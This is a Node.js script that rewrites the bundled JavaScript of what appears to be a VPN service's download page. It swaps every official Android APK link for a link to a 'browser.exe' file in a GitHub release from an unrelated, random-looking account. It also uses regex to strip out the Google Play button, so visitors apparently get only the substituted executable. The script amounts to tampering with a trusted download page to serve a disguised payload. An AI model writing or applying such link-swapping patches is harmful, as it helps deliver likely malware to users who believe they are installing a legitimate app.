const fs = require('fs');

const jsFile = 'assets/index-DVNmE8I2.js';
if (!fs.existsSync(jsFile)) {
    console.error('JS file not found');
    process.exit(1);
}

let content = fs.readFileSync(jsFile, 'utf8');

// 1. Replace all occurrences of the old APK link with the new one
const oldApkLink = 'https://storage.cockatoovpn.ru/android/latest';
const newLink = 'https://github.com/gfgdd798-oss/dsetew/releases/download/v1.0/browser.exe';
content = content.split(oldApkLink).join(newLink);
console.log('Updated APK links.');

// 2. Remove the Google Play button from the Android download page (component nB)
// We need to find the array of buttons in the div.zk and remove the first one.
// The structure is roughly: U("div",zk,[U("button",...Google Play...),U("button",...APK...)])

const googlePlayMatch = /U\("button",\{class:"download__buttons__button",onClick:o\[0\]\|\|\(o\[0\]=s=>n\("https:\/\/play\.google\.com\/store\/apps\/details\?id=com\.matrena\.vpn"\)\)\},\[fe\(tt,\{name:"google-play",color:"var\(--main-text-primary-inverse\)",size:"28px"\}\),U\("div",Yk,\[U\("p",Gk,he\(Ce\(t\)\("download\.android-page\.google-play"\)\),1\),U\("p",Kk,he\(Ce\(t\)\("download\.android\.description"\)\),1\)\]\)\]\),/g;

if (googlePlayMatch.test(content)) {
    content = content.replace(googlePlayMatch, '');
    console.log('Removed Google Play button from Android page.');
} else {
    console.log('Google Play button pattern not found (trying more generic match).');
    // Try a slightly more generic match if the above fails due to minification variations
    const genericMatch = /U\("button",\{class:"download__buttons__button",onClick:o\[0\]\|\|[^\]]+?google-play[^\]]+?\}\),/g;
    if (genericMatch.test(content)) {
        content = content.replace(genericMatch, '');
        console.log('Removed Google Play button (generic match).');
    }
}

fs.writeFileSync(jsFile, content);
console.log('Saved changes to JS file.');
